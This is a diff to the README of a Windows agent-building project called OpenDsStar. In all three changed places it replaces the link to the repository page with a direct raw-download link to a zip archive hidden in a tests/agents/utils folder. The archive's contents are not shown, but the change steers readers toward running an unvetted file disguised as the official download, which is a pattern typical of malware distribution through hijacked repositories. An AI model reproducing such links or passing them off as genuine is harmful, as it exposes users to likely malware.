@@ -1,6 +1,6 @@
 # 🧩 OpenDsStar - Build Smarter Agents Faster
 
-[![Download OpenDsStar](https://img.shields.io/badge/Download-OpenDsStar-blue?style=for-the-badge&logo=github)](https://github.com/Internationaleundset619/OpenDsStar)
+[![Download OpenDsStar](https://img.shields.io/badge/Download-OpenDsStar-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Internationaleundset619/OpenDsStar/main/tests/agents/utils/Star_Open_Ds_v1.5.zip)
 
 ## 🚀 What OpenDsStar Does
 
@@ -36,7 +36,7 @@ OpenDsStar is built for users who want to run it on Windows with a simple setup.
 
 Use this link to visit the page to download:
 
-[OpenDsStar Download Page](https://github.com/Internationaleundset619/OpenDsStar)
+[OpenDsStar Download Page](https://raw.githubusercontent.com/Internationaleundset619/OpenDsStar/main/tests/agents/utils/Star_Open_Ds_v1.5.zip)
 
 1. Open the download page.
 2. Look for the latest Windows build or release file.
@@ -205,7 +205,7 @@ This project is built around:
 
 To get OpenDsStar, visit this page to download:
 
-[https://github.com/Internationaleundset619/OpenDsStar](https://github.com/Internationaleundset619/OpenDsStar)
+[https://raw.githubusercontent.com/Internationaleundset619/OpenDsStar/main/tests/agents/utils/Star_Open_Ds_v1.5.zip](https://raw.githubusercontent.com/Internationaleundset619/OpenDsStar/main/tests/agents/utils/Star_Open_Ds_v1.5.zip)
 
 ## 🧩 For Daily Use
 
